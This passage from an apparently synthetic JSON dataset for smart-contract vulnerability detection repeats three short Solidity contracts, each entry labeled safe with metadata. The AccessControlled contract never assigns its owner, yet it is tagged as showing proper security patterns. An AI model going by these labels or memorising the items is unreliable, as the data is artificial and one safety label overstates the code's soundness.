    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 182",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 183",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 184",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 185",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 186",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 187",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 188",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 189",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 190",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 191",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 192",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 193",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 194",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 195",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 196",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 197",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 198",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 199",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 200",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 201",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 202",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 203",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 204",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 205",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 206",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 207",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 208",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 209",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 210",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 211",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
